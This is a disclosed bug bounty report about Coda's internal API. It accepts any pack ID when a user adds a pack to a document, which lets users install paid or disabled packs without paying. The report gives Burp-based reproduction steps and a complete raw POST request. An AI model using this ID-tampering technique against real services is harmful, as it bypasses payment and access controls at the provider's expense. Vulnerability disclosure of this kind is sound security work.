# Unrestricted access to any "connected pack" on docs

## Report Details
- **Report ID**: 777942
- **URL**: https://hackerone.com/reports/777942
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-19T17:44:40.327Z
- **Disclosed**: 2020-04-14T22:42:49.113Z

## Reporter
- **Username**: 0xcrypto
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: coda_bbp

## Vulnerability Information
## Summary:
When adding a pack, a post request is sent to ```https://coda.io/internalAppApi/documents/[doc ID]/packs``` with data ```{"packId":[pack Id]}``` where doc ID is the id of doc user wishes to add pack and pack ID is the pack user wants to install.
But this request is unrestricted and the user can iterate over packId to get any free/pro/disabled pack.

## Steps To Reproduce:
  1. Capture the post request while installing any pack using a proxy like Burp when you are logged in.
  2. Change packId to desired pack's ID. A valid packId gives a 200 status and invalid gives 400.

The below post request contains packId of Google Translate Pack which is a pro pack.

```
POST /internalAppApi/documents/F5Y1qJ3aw-/packs HTTP/1.1
Host: coda.io
Connection: close
Content-Length: 15
Accept: application/json
Origin: https://coda.io
X-Csrf-Token: InEwS0Z2U21xR09JUDI2Qkwi
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Content-Type: application/json
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://coda.io/d/Untitled_dF5Y1qJ3aw-/asdf_suTAx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: /* Your Cookie */

{"packId":1063}
```

Sending the request should return a 200 OK. Check the doc, the pro pack is installed.

[This doc](https://coda.io/d/Untitled_dNvxRin_XtJ) created by 0x00cryptohackeronetester@gmail.com uses Google Translate pro pack without upgrading. Installing the pro pack gives a 14 days warning. I am not sure if it will expire and become read only.

## Impact

Allows anyone to use paid functionality for free causing loss to business.

## Attachments
No attachments
